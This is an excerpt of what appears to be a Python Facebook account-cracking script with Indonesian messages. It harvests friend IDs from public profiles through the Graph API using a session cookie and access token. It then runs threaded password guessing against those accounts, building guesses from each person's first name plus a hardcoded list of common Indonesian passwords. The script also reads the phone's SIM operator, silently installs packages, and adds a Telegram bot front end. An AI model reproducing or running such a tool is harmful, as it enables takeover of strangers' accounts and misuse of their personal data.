...
try:
    ...
    os.system("pip install python-telegram-bot -q")
    try:
        from telegram import Update
        from telegram.ext import Application, CommandHandler, ContextTypes
        from telegram.constants import ChatAction
...
try:
        ...
        try:simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True,stderr=subprocess.DEVNULL).decode("utf-8").split(",")[1].replace("\n","")
        except:simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True,stderr=subprocess.DEVNULL).decode("utf-8").split(",")[0].replace("\n","")
...
def dump_publikk(idfac,fields,cookie,token):
    try:
        ...
        if "error" in url:
            print(f"\n[!] Error dari Facebook API: {url['error'].get('message', 'Unknown error')}")
            return
        
        if "friends" not in url or "data" not in url["friends"]:
            print(f"\n[!] Tidak dapat mengakses daftar teman. Pastikan akun bersifat publik atau token valid.")
            return
        ...
        if "paging" in url["friends"] and "cursors" in url["friends"]["paging"] and "after" in url["friends"]["paging"]["cursors"]:
            dump_publikk(idfac,url["friends"]["paging"]["cursors"]["after"],cookie,token)
    except KeyError as e:
        print(f"\n[!] Error: Data tidak lengkap - {str(e)}")
...
def dump_id_publik(idfac, fields, cookie, token, filename):
    try:
        ...
        if "error" in url:
            print(f"\n[!] Error dari Facebook API: {url['error'].get('message', 'Unknown error')}")
            if fields == "":
                print(f"[!] Token atau cookie mungkin tidak valid atau sudah expired")
            return
        ...
        print(f"\n[!] Error: Data tidak lengkap - {str(e)}")
        if fields == "":
            print(f"[!] Kemungkinan token tidak valid atau sudah expired")
    except requests.exceptions.RequestException as e:
        print(f"\n[!] Error koneksi: {str(e)}")
    except Exception as e:
        print(f"\n[!] Error tidak terduga: {str(e)}")
    ...
    with prog:
        with tred(max_workers=30) as pool:
            for yuzong in id2:
                ...
                frs = nmf.split(" ")[0]
                pwv = ["indonesia123","bismillah123","sayangku123","sayang","anjing","kontol","bangsat","kamu nanya","sayang123","anjing123"]
                if len(nmf) < 6:
                    if len(frs) < 3:
                        pass
                    else:
    ...
    with prog:
        with tred(max_workers=30) as pool:
            for yuzong in id2:
                idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
                frs = nmf.split(" ")[0]
                pwv = ["bismillah123","sayangku123","indonesia123","sayang","anjing","kontol","bangsat","kamu nanya","sayang123","anjing123"]
                if len(nmf)<6:
                    if len(frs)<3:
                        pass
                    else:
...
async def telegram_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🤖 Bot Scraper Facebook\n\nKomando:\n/menu - Menu utama\n/help - Bantuan\n/login - Login")

async def telegram_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_txt = "📝 Bot ini memberikan akses ke semua fitur run.py:\n\n• /menu - Lihat menu\n• /login - Jalankan login\n• /help - Ini"
...
async def telegram_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    await update.message.reply_text("⚙️ Menu sedang dijalankan di terminal. Cek output di bawah.\n\n📋 Menu utama tersedia. Ketik pilihan Anda di terminal.")

async def telegram_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.chat.send_action(ChatAction.TYPING)
    await update.message.reply_text("🔐 Login sedang dijalankan. Cek terminal untuk interaksi.")
...
def run_telegram_bot():
    ...
    try:
        ...
        telegram_app.add_handler(CommandHandler("menu", telegram_menu))
        telegram_app.add_handler(CommandHandler("login", telegram_login))
...
if __name__ == "__main__":
    ...
    # Telegram bot sekarang dijalankan dari telegram_bot.py
    # Code ini di-nonaktifkan untuk menghindari duplikasi
    # if os.getenv('TELEGRAM_BOT_TOKEN') and TELEGRAM_AVAILABLE:
    #     print("🤖 Mode Telegram Bot aktif...")
    #     run_telegram_bot()
    # else:
